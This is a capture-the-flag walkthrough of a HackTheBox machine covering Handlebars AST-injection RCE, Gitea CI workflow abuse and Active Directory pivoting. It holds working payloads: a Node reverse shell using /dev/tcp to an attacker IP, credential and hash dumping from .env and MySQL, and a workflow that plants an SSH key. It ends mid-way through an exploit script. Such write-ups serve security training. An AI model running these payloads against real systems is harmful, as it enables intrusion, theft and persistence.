---
title: DarkZero Returns
machineName: DarkZero Returns
os: linux
difficulty: hard
season: Season 11
tags:
  - Web Exploitation
  - SSTI
  - AST Injection
  - Handlebars
  - CVE-2026-33937
  - Gitea CI/CD
  - Context Confusion
  - CVE-2026-20750
  - Kerberos
  - Active Directory
  - DACL Abuse
  - Cross-Domain Trusts
  - Golden Ticket
  - SeBackupPrivilege
date: '2026-08-29'
pointsAwarded: 40
machineIP: '10.129.94.213'
summary: 'Detailed walkthrough for DarkZero Returns, featuring Handlebars AST Type Confusion RCE (CVE-2026-33937), Ligolo-ng tunneling, Gitea CI/CD context confusion (CVE-2026-20750), Active Directory DACL child object creation, ksu root escalation, and cross-domain trust exploitation via forged golden referral tickets.'
---

# 🛡️ HTB - DarkZero Returns (Hard)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux%20%2F%20Windows%20AD-blue?style=for-the-badge&logo=linux" alt="OS Linux / AD" />
  <img src="https://img.shields.io/badge/Difficulty-Hard-red?style=for-the-badge" alt="Hard Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** DarkZero Returns
- **Operating System:** Linux (Ubuntu 24.04) / Windows Server 2025 Active Directory (`darkzero.ext` & `darkzero.htb`)
- **Difficulty:** Hard (40 pts)
- **Primary Attack Vectors:** Handlebars AST Type Confusion RCE (CVE-2026-33937), Ligolo-ng Pivoting, Gitea CI/CD Context Confusion (CVE-2026-20750), Active Directory DACL Abuse (Child Object Creation), `ksu` Kerberos Escalation, Cross-Domain Trust Exploitation via Forged Golden Referral Tickets.

---

## Step 1 - Reconnaissance

### Service Discovery & Port Scanning

Let's start our Enumeration by a quick NMAP scan:

```bash
nmap -p- -sV -sC --min-rate 5000 -v -Pn 10.129.94.213
```

```text
Nmap scan report for dzcampaigns.htb (10.129.94.213)
Host is up (0.55s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: DarkZero Campaigns
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 12:56
Completed NSE at 12:56, 0.00s elapsed
Initiating NSE at 12:56
Completed NSE at 12:56, 0.00s elapsed
Initiating NSE at 12:56
Completed NSE at 12:56, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.39 seconds
           Raw packets sent: 131084 (5.768MB) | Rcvd: 25 (1.100KB)
```

- 🔍 *This is something new now. Because it's unusual for a Hard machine to only have 2 ports open, while they are not even solid Windows ports except web. Let's see what they have and try to understand the application. The web is located at **http://dzcampaigns.htb**.*

### Web Application Enumeration (dzcampaigns.htb)

![web-img](images/DarkZeroReturns/d1.png)

- 🔍 *By looking at the front page, it appears to be an ancient story with fictional characters, and the language used is very cryptic and ancient. Let's navigate the web!*

![web-img](images/DarkZeroReturns/d2.png)

![web-img](images/DarkZeroReturns/d3.png)

- 🔍 *Here's the login page, with a registration API. Let's register and access the dashboard to see what we can find.*

![web-img](images/DarkZeroReturns/d4.png)

- 🔍 *After registration and login, the user dashboard is presented:*

![web-img](images/DarkZeroReturns/d5.png)

- 🔍 *The dashboard provides character creation capabilities with specific characteristics, storyline, role, etc., which later appear on the site as ancient characters. There's also a dice roller showing quotes based on the sides, which had no technical interest.*

However, let's try creating a new character and observe what actually happens:

![web-img](images/DarkZeroReturns/d6.png)

- 🔍 *This is what the form looks like. We can fill up the form to add the character, and then it will appear in the web campaign.*

![web-img](images/DarkZeroReturns/d7.png)

- 🔍 *Once the character is created, it gives us 3 options: Inventory (assign weapon), Edit (modify information), and Delete.*

![web-img](images/DarkZeroReturns/d7.5.png)

As mentioned, the character appears on the homepage. Despite thorough enumeration, there were no additional subdomains or directories. This pointed towards an in-application vulnerability: SSRF, SSTI, or SQLi.

While enumerating the app, I located a few `.js` files for form, dice, and app, but they were chunked front-end bundles.

- 🔍 *To check for vulnerabilities, I intercepted the character editing request in Burp Suite:*

![web-img](images/DarkZeroReturns/d8.png)

- 🔍 *Testing for SSRF and XSS yielded no leads, as input fields reflected strings verbatim without executing HTML/JS tags.*

### Server-Side Template Injection (SSTI) Discovery

Moving towards SSTI (Server-Side Template Injection):

> [!NOTE]
> **What is SSTI?** It is a critical web security vulnerability that occurs when an application embeds untrusted user input directly into a server-side web template engine without proper sanitization. Instead of treating the user's input as plain text, the server interprets it as executable code. This allows an attacker to inject malicious template directives, read sensitive files, or completely compromise the system via Remote Code Execution (RCE).

- 🔍 *SSTI can be tested on input fields, and the best place to check was the character creation form because entries are saved and immediately reflected on the homepage.*
- 🔍 *First, let's test SSTI template expressions in all input fields:*

![web-img](images/DarkZeroReturns/d8.5.png)

Clicking "Save info" returned "Something Went Wrong". This was due to input filters preventing special characters. However, submitting simple template canary strings like `{{canary}}` revealed which field was vulnerable:

![web-img](images/DarkZeroReturns/d10.png)

- 🔍 *Closely examining the last two entries: for those entries I injected `{{canary}}`, and the `campaign_message` parameter rendered completely empty! When the engine sees `{{canary}}`, it tries to look up an undefined variable named `canary` and evaluates to an empty string. This confirms SSTI on the `campaign_message` field.*

### SSTI Engine Identification & Behavioral Analysis

Many engines use the `{{ }}` "mustache" syntax (including Twig, Jinja2, Vue, Angular, and Mustache itself). To identify the exact engine, we analyze behavioral differences across common payloads:

| Payload | Expected Result (Handlebars) | Expected Result (Mustache) | Expected Result (Jinja2 / Twig / Smarty) | Technical Explanation / Purpose |
| :--- | :--- | :--- | :--- | :--- |
| `{{7*7}}` | Empty or Error | Empty or Error | `49` | Identifies Python/PHP/Ruby engines. Handlebars handles logic-less paths, not inline arithmetic. |
| `{{#if true}}VULN{{/if}}` | `VULN` | Error / Literal Text | Error / Literal Text | Verifies block helpers. Handlebars natively parses `#if`, which is invalid syntax in Jinja2 or Mustache. |
| `{{#with "test"}}{{this}}{{/with}}` | `test` | Error / Blank | Error / Literal Text | Distinguishes Handlebars from Mustache. Mustache cannot handle context shifting via the `#with` helper. |
| `{{this}}` or `{{.}}` | `[object Object]` | `[object Object]` | Error / Literal Text | Confirms JavaScript-backed context evaluation (Node.js runtime environment). |
| `{{constructor}}` | `[function Object]` | Empty / Escape | Error / Literal Text | Proves server-side property access, paving the way for Prototype Pollution or SSTI RCE. |

- 🔍 *I tested the Handlebars payload syntax by modifying the `campaign_message` parameter to `{{#if true}}VULN{{/if}}`:*

![web-img](images/DarkZeroReturns/d11.png)

![web-img](images/DarkZeroReturns/d12.png)

The rendered output returned `VULN`, confirming **Handlebars** as the server-side template engine!

### Vulnerability Analysis: Handlebars AST Type Confusion (CVE-2026-33937)

The application did not disclose the Handlebars version via headers. Behavioral probing (`{{constructor.name}}` → blank) indicated a hardened runtime (≥4.7.x), ruling out standard prototype constructor chains. Researching known vulnerabilities revealed:

> [!WARNING]
> **CVE-2026-33937 Technical Advisory:** Handlebars.js JavaScript Injection via AST Type Confusion ([GHSA-2w6w-674q-4c4q](https://github.com/advisories/GHSA-2w6w-674q-4c4q)).
> `Handlebars.compile()` accepts a pre-parsed AST object in addition to a template string. The `value` field of a `NumberLiteral` AST node is emitted directly into generated JavaScript without quoting or sanitization. Supplying a crafted AST to `compile()` allows injecting arbitrary JavaScript, leading to Remote Code Execution on the server.

Handlebars processes templates in three distinct stages:
1. **Parse**: Template string is converted into an Abstract Syntax Tree (AST) representing nodes (`Program`, `MustacheStatement`, `BlockStatement`, `PathExpression`, `StringLiteral`, `NumberLiteral`).
2. **Compile**: The AST is translated into a JavaScript function.
3. **Execute**: The compiled function is invoked with the context object to produce HTML.

The security model assumes the developer writes the AST (the program) and the user only supplies context (the data). CVE-2026-33937 completely inverts this assumption.

#### Root Cause Analysis
The endpoint accepts `campaign_message` as JSON and feeds it **directly into the Handlebars compiler as an already-parsed AST**, skipping the `parse()` phase entirely. Because the parser never runs, parser-level restrictions and string sanitizations are completely bypassed.

#### From AST Control to Code Execution
With node-level control, the payload walks the JavaScript prototype chain from an innocuous value to the `Function` constructor, invoking Node's module system:

```text
"s" → String.prototype.split → Array → Array.prototype.pop → function object
   → .constructor → Function("return process.mainModule.require('child_process')")
   → .execSync(...)   →   arbitrary OS commands as darkzero
```

---

### Phase 1: Proving Server-Side AST Compilation

> [!TIP]
> **Attack Objective:** Probe the `campaign_message` parameter by injecting a raw AST JSON object and verify whether the server compiles and evaluates pre-parsed AST nodes directly into the response.

To confirm that the server compiles raw JSON as an AST, we probe the `campaign_message` parameter with an AST node structure containing an explicit `ContentStatement`:

```text
_csrf=csrf_value&name=wasd&race=dasdad&class=sadw&backstory=dasdawda&campaign_message={"type":"Program","body":[{"type":"ContentStatement","value":"AST_IS_COMPILED"}],"blockParams":[],"decorators":[]}
```

This payload instructs the compiler to emit the literal string `"AST_IS_COMPILED"`:

![web-img](images/DarkZeroReturns/d13.1.png)

In Burp Suite, the URL-encoded AST is transmitted. After following the redirection, the response confirms the vulnerability:

![web-img](images/DarkZeroReturns/d14.png)

The string `AST_IS_COMPILED` is rendered in the HTML, confirming arbitrary AST compilation!

---

### Phase 2: Constructing the RCE Payload via AST Type Confusion

Client-side JavaScript revealed that the application submits `campaign_message` as a JSON object representing a Handlebars AST, which Express passes directly into `Handlebars.compile()`.

When Handlebars compiles a `NumberLiteral` AST node, it expects the `value` property to be a raw number (e.g. `1`), generating:

```javascript
// Normal generated code:
lookup(context, 1)
```

However, because the compiler lacks data type validation on `value`, supplying a string containing JavaScript breaks out of the lookup context:

```javascript
// Injected code breakout:
lookup(context, {},{})) + process.mainModule.require(...) //)
```

- `{},{}))` prematurely closes the `lookup()` function call.
- `+ process...` executes arbitrary Node.js code.
- `//` comments out trailing syntax so JavaScript evaluation does not crash.

We craft the full JSON AST targeting the `lookup` helper:

```json
{
  "_csrf": "<csrf_token>",
  "name": "asdffd",
  "race": "afdasfas",
  "class": "asdfasf",
  "backstory": "asfasfasas",
  "campaign_message": {
    "type": "Program",
    "body": [
      {
        "type": "MustacheStatement",
        "path": {
          "type": "PathExpression",
          "data": false,
          "depth": 0,
          "parts": ["lookup"],
          "original": "lookup",
          "loc": null
        },
        "params": [
          {
            "type": "PathExpression",
            "data": false,
            "depth": 0,
            "parts": [],
            "original": "this",
            "loc": null
          },
          {
            "type": "NumberLiteral",
            "value": "{},{})) + process.mainModule.require('child_process').execFileSync('/bin/bash',['-c','bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"']).toString() //",
            "original": 1,
            "loc": null
          }
        ],
        "escaped": true,
        "strip": { "open": false, "close": false },
        "loc": null
      }
    ],
    "strip": {},
    "loc": null
  }
}
```

- 🔍 *This prototype embeds the reverse shell inside the AST, sent with `Content-Type: application/json`.*

---

## Step 2 - Initial Foothold

### Phase 3: Executing the Malicious AST Payload & Reverse Shell

> [!IMPORTANT]
> **Execution Phase:** Intercept the character update request, embed the weaponized AST with the attacker listener configuration, and fire the request.

Intercept the character update request in Burp Suite and inject the AST into the `campaign_message` JSON field:

![web-img](images/DarkZeroReturns/d15.1.png)

```http
POST /character/15 HTTP/1.1
Host: dzcampaigns.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Origin: http://dzcampaigns.htb
Connection: close
Referer: http://dzcampaigns.htb/character/15/edit
Cookie: dz.sid=s%3AfjaHctdT10xw2NdZ4Bq48PfNgmEbtFRA.rV81%2BDbTaA4itydv%2FEeIvZoO0fvyXPKORz8MDD8zAQg
Content-Length: 1246

{
  "_csrf": "da79f0d7b875a8e24f13670df7fa2469bb811851165d650e9614b3d92cda698b",
  "name": "asdffd",
  "race": "afdasfas",
  "class": "asdfasf",
  "backstory": "asfasfasas",
  "campaign_message": {
    "type": "Program",
    "body": [
      {
        "type": "MustacheStatement",
        "path": {
          "type": "PathExpression",
          "data": false,
          "depth": 0,
          "parts": [
            "lookup"
          ],
          "original": "lookup",
          "loc": null
        },
        "params": [
          {
            "type": "PathExpression",
            "data": false,
            "depth": 0,
            "parts": [],
            "original": "this",
            "loc": null
          },
          {
            "type": "NumberLiteral",
            "value": "{},{})) + process.mainModule.require('child_process').execFileSync('/bin/bash',['-c','bash -c "bash -i >& /dev/tcp/10.10.15.54/7986 0>&1"']).toString() //",
            "original": 1,
            "loc": null
          }
        ],
        "escaped": true,
        "strip": {
          "open": false,
          "close": false
        },
        "loc": null
      }
    ],
    "strip": {},
    "loc": null
  }
}
```

The server executes the payload and connects back to our netcat listener:

```bash
nc -lvnp 7986
```

```text
listening on [any] 7986 ...
connect to [10.10.15.54] from (UNKNOWN) [10.129.96.90] 58696
bash: cannot set terminal process group (901): Inappropriate ioctl for device
bash: no job control in this shell
darkzero@SRV01:~$ id
uid=996(darkzero) gid=987(darkzero) groups=987(darkzero)
```

### Local Enumeration & Environment Verification

With a foothold as `darkzero`, we verify the exact Handlebars dependencies from `package.json`:

```bash
darkzero@SRV01:~$ cat package.json | grep handlebars
```

```text
    "express-handlebars": "^7.0.7",
    "handlebars": "4.7.8",
```

Listing the application root directory:

```bash
darkzero@SRV01:~$ ls -la
```

```text
total 84
drwxrwxr-x   6 darkzero darkzero  4096 Jul 14 06:10 .
drwxr-xr-x   6 root     root      4096 Jul 21 05:39 ..
-rw-------   1 darkzero darkzero   133 May 20 10:11 .env
drwxrwxr-x 158 darkzero darkzero  4096 May 19 11:11 node_modules
drwxrwxr-x   4 darkzero darkzero  4096 May 19 10:55 .npm
-rw-rw-r--   1 darkzero darkzero   644 May 19 11:11 package.json
-rw-rw-r--   1 darkzero darkzero 43128 May 19 11:11 package-lock.json
drwxrwxr-x   2 darkzero darkzero  4096 May 19 08:53 scripts
-rw-rw-r--   1 darkzero darkzero  4638 May 19 11:11 server.js
drwxrwxr-x  12 darkzero darkzero  4096 Apr 24 14:45 src
```

### Database Enumeration & Hash Extraction

Inspecting `.env` yields database credentials:

```bash
darkzero@SRV01:~$ cat .env
```

```ini
PORT=8081
DB_HOST=localhost
DB_USER=darkzero
DB_PASSWORD=C4ntFindMyDMpass!
DB_NAME=darkzero_campaigns
SESSION_SECRET=DarkSession312#
```

Checking network configuration reveals an internal network interface:

```bash
darkzero@SRV01:~$ ifconfig
```

```text
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.20.3  netmask 255.255.255.0  broadcast 172.16.20.255
        ether 00:15:5d:f4:7c:02  txqueuelen 1000  (Ethernet)
        RX packets 4268  bytes 543570 (543.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5279  bytes 2763586 (2.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1038  bytes 2096137 (2.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1038  bytes 2096137 (2.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Enumerating the MySQL database:

```bash
darkzero@SRV01:~$ mysql -h 127.0.0.1 -u darkzero -p'C4ntFindMyDMpass!' darkzero_campaigns -e "SHOW TABLES;"
```

```text
+------------------------------+
| Tables_in_darkzero_campaigns |
+------------------------------+
| campaign_messages            |
| campaigns                    |
| character_items              |
| characters                   |
| items                        |
| sessions                     |
| users                        |
+------------------------------+
```

Extracting users and password hashes:

```bash
darkzero@SRV01:~$ mysql -h 127.0.0.1 -u darkzero -p'C4ntFindMyDMpass!' darkzero_campaigns -e "SELECT * FROM users;"
```

```text
+----+-----------------------+----------+--------------------------------------------------------------+--------+---------------------+
| id | email                 | username | password_hash                                                | role   | created_at          |
+----+-----------------------+----------+--------------------------------------------------------------+--------+---------------------+
|  1 | admin@dzcampaigns.htb | admin    | $2b$10$HDdWzYvp1IWFD9TB4JsuCerlh.vKchv/LmBruCmKGH19hPP7IXvjm | admin  | 2026-04-19 15:34:56 |
|  3 | josh@dzcampaigns.htb  | josh     | $2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK | player | 2026-05-19 14:31:30 |
|  4 | im@gmail.com          | wasw     | $2b$10$TAhYZTEHc/UnN0afT1V/dO171L5H5F.A3X.hrWBKyXPE.CyH3ggCW | player | 2026-08-26 21:26:05 |
+----+-----------------------+----------+--------------------------------------------------------------+--------+---------------------+
```

- 🔍 *We obtained bcrypt hashes for `admin` and `josh`. Cracking the hash for josh yielded:*

```text
josh@dzcampaigns.htb:Rangers1
```

### SSH Foothold as User Josh

We connect via SSH using the recovered credentials:

```bash
ssh josh@dzcampaigns.htb
```

```bash
josh@SRV01:~$ id
uid=780601110(josh) gid=780600513(domain users) groups=780600513(domain users),780601111(repoaudit)
```

- 🔍 *Josh is a domain user and member of `repoaudit`. Let's inspect running processes:*

```bash
josh@SRV01:/tmp$ ps auxf | grep gitea
```

```text
svc-run+    1408  0.0  1.1 1280288 21508 ?       Ssl  21:19   0:01 /opt/gitea-runner/act_runner daemon --config /opt/gitea-runner/config.yaml
josh        1934  0.0  0.1   6544  2284 pts/1    S+   22:06   0:00              _ grep --color=auto gitea
```

A dedicated user named `svc-runner` runs the Gitea act_runner processes.

---

## Step 3 - Privilege Escalation

### Internal Pivoting via Ligolo-ng Tunneling

To interact with internal services on `172.16.20.0/24`, we establish a Ligolo-ng tunnel.

Start the proxy server on your attack machine:

```bash
sudo ./proxy -selfcert
```

Transfer and run the agent on SRV01:

```bash
josh@SRV01:/tmp$ ./agent -connect 10.10.15.54:11601 -ignore-cert
```

```text
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.10.15.54:11601"
```

In the Ligolo-ng console, start the session tunnel:

```text
ligolo-ng » session
? Specify a session : 1 - josh@SRV01 - 10.129.97.25:61184 - 00155df47c02
[Agent : josh@SRV01] » start
INFO[0163] Starting tunnel to josh@SRV01 (00155df47c02)
```

Create the interface and routing on your attack machine:

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.20.0/24 dev ligolo
```

Verify connectivity through the tunnel:

```bash
ping -c 2 172.16.20.2
```

```text
PING 172.16.20.2 (172.16.20.2) 56(84) bytes of data.
64 bytes from 172.16.20.2: icmp_seq=1 ttl=64 time=318 ms
64 bytes from 172.16.20.2: icmp_seq=2 ttl=64 time=481 ms

--- 172.16.20.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 318.377/399.451/480.526/81.074 ms
```

### Internal Network Mapping & DC02 Reconnaissance

With the tunnel established, we perform an Nmap scan against `172.16.20.2`:

```bash
nmap -p- -sV -sC --min-rate 5000 -v -Pn 172.16.20.2
```

```text
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-26 15:24 UTC
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 15:24
Completed NSE at 15:24, 0.00s elapsed
Initiating NSE at 15:24
Completed NSE at 15:24, 0.00s elapsed
Initiating NSE at 15:24
Completed NSE at 15:24, 0.00s elapsed
Initiating SYN Stealth Scan at 15:24
Scanning dc02.darkzero.ext (172.16.20.2) [65535 ports]
Discovered open port 53/tcp on 172.16.20.2
Discovered open port 135/tcp on 172.16.20.2
Discovered open port 139/tcp on 172.16.20.2
Discovered open port 445/tcp on 172.16.20.2
Discovered open port 49669/tcp on 172.16.20.2
Discovered open port 464/tcp on 172.16.20.2
Discovered open port 49772/tcp on 172.16.20.2
Discovered open port 593/tcp on 172.16.20.2
Completed SYN Stealth Scan at 15:24, 29.78s elapsed (65535 total ports)
Initiating Service scan at 15:24
Scanning 8 services on dc02.darkzero.ext (172.16.20.2)
Completed Service scan at 15:24, 5.01s elapsed (8 services on 1 host)
NSE: Script scanning 172.16.20.2.
Initiating NSE at 15:24
Completed NSE at 15:25, 40.66s elapsed
Initiating NSE at 15:25
Completed NSE at 15:25, 0.01s elapsed
Initiating NSE at 15:25
Completed NSE at 15:25, 0.00s elapsed
Nmap scan report for dc02.darkzero.ext (172.16.20.2)
Host is up (0.83s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE    VERSION
53/tcp    open  tcpwrapped
135/tcp   open  tcpwrapped
139/tcp   open  tcpwrapped
445/tcp   open  tcpwrapped
464/tcp   open  tcpwrapped
593/tcp   open  tcpwrapped
49669/tcp open  tcpwrapped
49772/tcp open  tcpwrapped

Host script results:
|_clock-skew: 6h59m23s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-08-26T22:24:10
|_  start_date: N/A

NSE: Script Post-scanning.
Initiating NSE at 15:25
Completed NSE at 15:25, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.40 seconds
           Raw packets sent: 131083 (5.768MB) | Rcvd: 28 (1.176KB)
```

- 🔍 *We have identified domain controller `dc02.darkzero.ext` with active Active Directory / Kerberos / SMB services.*

Add the domain and Gitea subdomains to your hosts configuration:

![web-img](images/DarkZeroReturns/d16.png)

![web-img](images/DarkZeroReturns/d17.png)

### Kerberos SPNEGO Authentication & Gitea SSPI Session Theft

Josh's credentials did not authenticate directly on the Gitea web interface, but Gitea has **SSPI (Windows / Kerberos Authentication)** enabled:

> [!NOTE]
> **What is SSPI Login?** SSPI (Security Support Provider Interface) allows web applications joined to Active Directory to negotiate secure authentication via Kerberos/NTLM. When josh visits the Gitea SSPI endpoint, the browser uses his Kerberos Ticket Granting Ticket (TGT) to request a Service Ticket for `HTTP/gitea.darkzero.ext`, validating with the Domain Controller and issuing a session cookie (`i_like_gitea`).

Request a fresh Kerberos ticket as `josh`:

```bash
josh@SRV01:~$ export KRB5CCNAME=/tmp/josh.ccache
josh@SRV01:~$ echo "Rangers1" | kinit josh@DARKZERO.EXT
```

```text
Password for josh@DARKZERO.EXT: 
Warning: Your password will expire in less than one hour on Tue 14 Sep 2100 02:48:05 AM UTC
```

Perform the SPNEGO negotiation via `curl` using the Kerberos ticket cache:

```bash
josh@SRV01:~$ curl -v --negotiate -u : "http://gitea.darkzero.ext:3000/user/login?auth_with_sspi=1" 2>&1 | grep "Set-Cookie: i_like_gitea"
```

```text
< Set-Cookie: i_like_gitea=2a9a6c00c4cd2ec2; Path=/; HttpOnly; SameSite=Lax
< Set-Cookie: i_like_gitea=2f36a78834091b76; Path=/; HttpOnly; SameSite=Lax
```

Inject the second session cookie into your browser:

![web-img](images/DarkZeroReturns/d18.png)

We are logged into Gitea as `darkzero_ext_josh`!

### Gitea CI/CD Context Confusion Vulnerability Analysis (CVE-2026-20750)

Inspecting the Gitea version reveals **1.25.0**, vulnerable to **CVE-2026-20750 (Context Confusion in Actions Workflow Triggers)**:

> [!WARNING]
> **CVE-2026-20750 (The "Pwn Request" Variant):**
> When a user comments on a Pull Request via the API, Gitea's backend:
> 1. Reads the workflow file from the **Head Branch** (the attacker's malicious fork).
> 2. Assigns execution permissions based on the **Base Branch** (the trusted main repository).
> 
> Because `act_runner` on this target executes jobs locally on the host filesystem rather than inside Docker containers, code execution inside the workflow provides direct host RCE as `svc-runner`.

Inspect the existing workflow structure in `main.yaml`:

![web-img](images/DarkZeroReturns/d19.png)

The attack flow:
1. **Fork** the repository.
2. **Inject** a workflow triggered by `pull_request_review_comment`.
3. **Open a PR** against the main repository.
4. **Trigger the bug** by posting a review comment via the API.

---

### Gitea Exploitation Phase 1: Authentication & SSH Key Generation

Generate an SSH keypair to persist access:

```bash
josh@SRV01:~$ echo "Rangers1" | kinit josh@DARKZERO.EXT
josh@SRV01:~$ klist
```

```text
Ticket cache: FILE:/tmp/josh.ccache
Default principal: josh@DARKZERO.EXT

Valid starting       Expires              Service principal
08/27/2026 21:28:05  08/28/2026 07:28:05  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 09/03/2026 21:28:05
```

Generate a fresh keypair:

```bash
ssh-keygen -t ed25519 -f ./htb_key2 -N "" -q
export PUBKEY=$(cat ./htb_key2.pub)
```

---

### Gitea Exploitation Phase 2: Repository Forking & Branch Creation

Fork the base repository into Josh's namespace:

```bash
curl -s --negotiate -u : -X POST -H "Content-Type: application/json" -d '{}'   "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/forks" | jq '.full_name'
```

```text
"darkzero-ext_josh/DarkZero-Campaigns"
```

Create a unique timestamped branch on our fork:

```bash
export BRANCH="pwn-$(date +%s)"
echo "[*] Branch name: $BRANCH"

curl -s --negotiate -u : -X POST -H "Content-Type: application/json"   -d "{"new_branch_name":"$BRANCH", "old_branch_name":"main"}"   "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/DarkZero-Campaigns/branches" | jq '.name'
```

```text
[*] Branch name: pwn-1787866364
"pwn-1787866364"
```

---

### Gitea Exploitation Phase 3: Malicious Workflow Injection

Create the malicious workflow that appends our public key to `svc-runner`'s `authorized_keys`:

```bash
cat > /tmp/pwn.yml << EOF
name: pwn
on:
  pull_request_review_comment:
    types: [created]
jobs:
  pwn:
    runs-on: ubuntu
    steps:
      - name: persist
        run: |
          install -d -m 700 /home/svc-runner/.ssh
          echo '$PUBKEY' >> /home/svc-runner/.ssh/authorized_keys
          chmod 600 /home/svc-runner/.ssh/authorized_keys
          cat /home/svc-runner/user.txt
EOF
```

Base64-encode and upload the workflow file to our branch:

```bash
export CONTENT_B64=$(base64 -w0 /tmp/pwn.yml)

curl -s --negotiate -u : -X POST -H "Content-Type: application/json"   -d "{"content":"$CONTENT_B64", "message": "add workflow", "branch": "$BRANCH"}"   "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/DarkZero-Campaigns/contents/.gitea%2Fworkflows%2Fpwn.yml" | jq '.content.path'
```

```text
".gitea/workflows/pwn.yml"
```

---

### Gitea Exploitation Phase 4: Workflow Trigger via PR Review Comment

Open the Pull Request from our fork branch to `main`:

```bash
PR_RESP=$(curl -s --negotiate -u : -X POST -H "Content-Type: application/json"   -d "{"title":"pwn", "body": "pwn", "head": "darkzero-ext_josh:$BRANCH", "base": "main"}"   "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/pulls")

export PR_NUM=$(echo "$PR_RESP" | jq -r '.number')
export HEAD_SHA=$(echo "$PR_RESP" | jq -r '.head.sha')
echo "[+] PR #$PR_NUM created | Head SHA: $HEAD_SHA"
```

```text
[+] PR #1 created | Head SHA: e927ad2c9257b6a66059f790e75c92e1cf8222af
```

Fire the logic bug by posting a review comment via the API:

```bash
curl -s --negotiate -u : -X POST -H "Content-Type: application/json"   -d "{"event":"COMMENT", "body": "pwn", "commit_id": "$HEAD_SHA"}"   "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/pulls/$PR_NUM/reviews" | jq '.id'
```

```text
1
```

Connect via SSH using our key:

```bash
ssh -i ./htb_key2 -o StrictHostKeyChecking=no svc-runner@127.0.0.1
```

```bash
svc-runner@SRV01:~$ id
uid=780601113(svc-runner) gid=780600513(domain users) groups=780600513(domain users),780601114(servicehandler)
```

#### Master Exploit Automation Script (Josh to Svc-Runner)

```bash
#!/bin/bash
# ==============================================================================
# DarkZero HTB - Master Exploit Script (Josh -> Svc-Runner)
# ==============================================================================
JOSH_USER="josh"
JOSH_PASS="Rangers1"
DOMAIN="DARKZERO.EXT"
GITEA_URL="http://gitea.darkzero.ext:3000"
TARGET_REPO="DarkZero/DarkZero-Campaigns"

export KRB5CCNAME=/tmp/josh.ccache
echo "$JOSH_PASS" | kinit "$JOSH_USER@$DOMAIN" 2>/dev/null

rm -f ./htb_key2 ./htb_key2.pub
ssh-keygen -t ed25519 -f ./htb_key2 -N "" -q
PUBKEY=$(cat ./htb_key2.pub)

FORK_RESP=$(curl -s --negotiate -u : -X POST -H "Content-Type: application/json" -d '{}' "$GITEA_URL/api/v1/repos/$TARGET_REPO/forks")
FORK_USER="darkzero-ext_josh"
MY_FORK="$FORK_USER/DarkZero-Campaigns"

BRANCH_NAME="pwn-$(date +%s)"
curl -s --negotiate -u : -X POST -H "Content-Type: application/json"   -d "{"new_branch_name":"$BRANCH_NAME", "old_branch_name":"main"}"   "$GITEA_URL/api/v1/repos/$MY_FORK/branches" > /dev/null

cat > /tmp/pwn.yml << EOF
name: pwn
on:
  pull_request_review_comment:
    types: [created]
jobs:
  pwn:
    runs-on: ubuntu
    steps:
      - name: persist
        run: |
          install -d -m 700 /home/svc-runner/.ssh
          echo '$PUBKEY' >> /home/svc-runner/.ssh/authorized_keys
          chmod 600 /home/svc-runner/.ssh/authorized_keys
          cat /home/svc-runner/user.txt
EOF

CONTENT_B64=$(base64 -w0 /tmp/pwn.yml)
